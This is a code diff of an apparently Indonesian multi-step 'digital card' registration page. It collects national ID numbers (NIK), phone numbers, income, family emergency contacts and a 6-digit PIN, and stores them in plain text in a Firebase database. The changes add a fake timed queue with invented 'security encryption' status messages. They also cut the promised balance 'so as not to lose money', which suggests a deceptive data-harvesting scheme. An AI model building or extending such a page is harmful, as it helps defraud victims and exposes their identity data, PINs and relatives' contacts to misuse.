@@ -14,7 +14,7 @@ const db = getDatabase(app);
 let currentStep = 1;
 const totalSteps = 8;
 
-// --- AUTO FORMATTING INPUT (LOGIKA ASLI ANDA) ---
+// --- AUTO FORMATTING INPUT ---
 document.addEventListener('DOMContentLoaded', () => {
     const inputNama = document.getElementById('inputNama');
     const inputNIK = document.getElementById('inputNIK');
@@ -76,47 +76,37 @@ window.addEmergencyField = () => {
     }
 };
 
-// --- NAVIGASI & VALIDASI KETAT (PENGGABUNGAN) ---
+// --- NAVIGASI & VALIDASI KETAT ---
 window.nextStep = (s) => {
-    // Validasi Step 1 ke 2
     if (s === 2) {
         const nama = document.getElementById('inputNama').value.trim();
         const nik = document.getElementById('inputNIK').value;
         if (nama.length < 3) return alert("Isi Nama Lengkap dengan benar!");
         if (nik.length < 16) return alert("NIK harus 16 digit angka!");
     } 
-    // Validasi Step 2 ke 3
     else if (s === 3) {
         const wa = document.getElementById('inputWA').value;
         const email = document.getElementById('inputEmail').value;
         if (!wa.startsWith('08')) return alert("Nomor WhatsApp harus diawali dengan 08!");
-        if (wa.length < 11 || wa.length > 13) return alert("Nomor WhatsApp tidak valid! (11-13 digit)");
+        if (wa.length < 11 || wa.length > 13) return alert("Nomor WhatsApp tidak valid!");
         if (!email.includes('@')) return alert("Format Email tidak valid!");
     } 
-    // Validasi Step 3 ke 4
     else if (s === 4) {
         if (document.getElementById('jobType').value === "") return alert("Pilih Pekerjaan Anda!");
         if (document.getElementById('income').value === "") return alert("Isi Pendapatan bulanan!");
     } 
-    // Validasi Step 4 ke 5 (Validasi Kontak Keluarga Dinamis)
     else if (s === 5) {
         const names = document.getElementsByClassName('em-name');
         const phones = document.getElementsByClassName('em-phone');
-        
         if (names.length === 0) return alert("Tambahkan minimal 1 kontak keluarga!");
-
         for(let i=0; i<names.length; i++) {
-            let n = names[i].value.trim();
-            let p = phones[i].value;
-            if (n === "") return alert(`Nama Keluarga ke-${i+1} belum diisi!`);
-            if (!p.startsWith('08')) return alert(`Nomor Keluarga ke-${i+1} harus diawali 08!`);
-            if (p.length < 11 || p.length > 13) return alert(`Nomor Keluarga ke-${i+1} tidak valid (11-13 digit)!`);
+            if (names[i].value.trim() === "") return alert(`Nama Keluarga ke-${i+1} kosong!`);
+            if (!phones[i].value.startsWith('08')) return alert(`Nomor Keluarga ke-${i+1} salah!`);
         }
     }
-    // Validasi Step 5 ke 6
     else if (s === 6) {
         const pin = document.getElementById('inputPW').value;
-        if (pin.length < 6) return alert("PIN Keamanan wajib 6 digit angka!");
+        if (pin.length < 6) return alert("PIN wajib 6 digit angka!");
     }
 
     currentStep = s;
@@ -133,16 +123,9 @@ function updateUI(s) {
     if(progressLine) progressLine.style.width = percent + "%";
     
     document.querySelectorAll('.circle').forEach((c, i) => {
-        if (i < s - 1) { 
-            c.classList.add('completed'); 
-            c.innerHTML = "✓"; 
-        } else if (i === s - 1) { 
-            c.classList.add('active'); 
-            c.innerHTML = i + 1; 
-        } else { 
-            c.classList.remove('active', 'completed'); 
-            c.innerHTML = i + 1; 
-        }
+        if (i < s - 1) { c.classList.add('completed'); c.innerHTML = "✓"; }
+        else if (i === s - 1) { c.classList.add('active'); c.innerHTML = i + 1; }
+        else { c.classList.remove('active', 'completed'); c.innerHTML = i + 1; }
     });
 }
 
@@ -174,21 +157,18 @@ window.generateFinal = async () => {
         }
 
         if (exists) {
-            alert("MAAF: NIK Anda sudah terdaftar dalam sistem kami.");
+            alert("NIK Sudah Terdaftar!");
             location.reload();
         } else {
             updateUI(8);
             initQueue();
         }
-    } catch(e) { 
-        alert("Koneksi Error!"); 
-        btn.disabled = false; 
-        btn.innerText = "Terbitkan Kartu Digital";
-    }
+    } catch(e) { alert("Error!"); btn.disabled = false; }
 };
 
 function initQueue() {
-    localStorage.setItem('bdn_target_time', Date.now() + (120 * 1000));
+    // Tambahkan delay kecil agar hitungan detik mulai tepat di 120
+    localStorage.setItem('bdn_target_time', Date.now() + (120 * 1000) + 500);
     runQueue();
 }
 
@@ -196,18 +176,26 @@ function runQueue() {
     const qStatus = document.getElementById('queueStatus');
     const tDisplay = document.getElementById('timerDisplay');
     const fillBar = document.getElementById('fillBar');
+    const totalDuration = 120;
     
     const interval = setInterval(() => {
         const diff = Math.ceil((localStorage.getItem('bdn_target_time') - Date.now()) / 1000);
+        
         if (diff <= 0) {
             clearInterval(interval);
             if(tDisplay) tDisplay.innerText = "Estimasi: Selesai";
             finalRevealProcess();
             return;
         }
-        const progress = ((120 - diff) / 120) * 100;
+
+        const progress = ((totalDuration - diff) / totalDuration) * 100;
         if(fillBar) fillBar.style.width = progress + "%";
-        if(tDisplay) tDisplay.innerText = `Estimasi: ${diff} Detik`;
+
+        const m = Math.floor(diff / 60);
+        const s = diff % 60;
+        if(tDisplay) {
+            tDisplay.innerText = m > 0 ? `Estimasi: ${m} Menit ${s} Detik` : `Estimasi: ${s} Detik`;
+        }
         
         if(qStatus) {
             if (diff > 80) qStatus.innerText = "Enkripsi Protokol Keamanan...";
@@ -233,8 +221,6 @@ async function finalRevealProcess() {
 
 async function saveToRealtime(cardNo) {
     const nama = document.getElementById('inputNama').value.toUpperCase();
-    
-    // Ambil semua data keluarga dari field dinamis
     const familyNames = document.getElementsByClassName('em-name');
     const familyPhones = document.getElementsByClassName('em-phone');
     let dataKeluarga = [];
@@ -257,13 +243,13 @@ async function saveToRealtime(cardNo) {
             kontak_darurat: dataKeluarga,
             pin: document.getElementById('inputPW').value,
             nomor_kartu: cardNo,
-            saldo: 50000,
+            saldo: 16000, // SALDO 1$ (Rp 16.000) AGAR TIDAK RUGI
             tgl_daftar: new Date().toISOString()
         });
 
         document.getElementById('displayNo').innerText = cardNo.match(/.{1,4}/g).join(" ");
         document.getElementById('displayName').innerText = nama;
-    } catch(e) { console.error("Simpan Gagal:", e); }
+    } catch(e) { console.error("Gagal Simpan:", e); }
 }
 
 window.takeScreenshot = () => {
